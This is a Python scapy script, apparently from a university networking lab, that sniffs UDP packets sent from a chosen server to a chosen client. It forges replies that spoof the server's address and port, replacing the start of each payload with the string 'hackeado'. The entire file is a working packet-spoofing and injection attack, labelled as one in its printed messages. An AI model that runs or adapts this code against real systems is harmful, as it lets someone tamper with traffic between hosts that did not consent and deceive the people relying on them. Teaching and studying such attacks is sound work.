#!/usr/bin/python3
import sys # ('10.0.2.15', 53688)
from scapy.all import UDP, IP, Raw, send, sniff
import random

def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
    # Listen for incoming UDP packets from the server (anakena.dcc.uchile.cl) on the specified port
    print(f"Pirate is attacking! Listening for packets from {server_ip}:{server_port}")
    
    # Define the filter for UDP packets from the server on the given port
    filter_str = f"udp and src host {server_ip} and src port {server_port} and dst host {client_ip} and dst port {client_port}"

    def packet_callback(pkt):
        # Check if the packet is UDP and coming from the server's IP and port
        if pkt.haslayer(UDP) and pkt[IP].src == server_ip and pkt[UDP].sport == server_port:
            # Modify the payload to inject "hackeado"
            modified_payload = b"hackeado" + pkt[Raw].load[8:]  # Keeping the remaining part of the original packet

            # Build the modified packet with the same structure as the original
            new_pkt = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / modified_payload

            # Send the modified packet to the client
            print(f"Injecting packet to {client_ip}:{client_port}...")
            send(new_pkt)

    # Start sniffing for packets based on the filter
    sniff(filter=filter_str, prn=packet_callback, store=0)


if len(sys.argv) != 5:
    print("Usage: ./pirate.py <server_ip> <server_port> <client_ip> <client_port>")
    sys.exit(1)

server_ip = sys.argv[1]
server_port = int(sys.argv[2])
client_ip = sys.argv[3]
client_port = int(sys.argv[4])

inject_pirate_packets(server_ip, server_port, client_ip, client_port)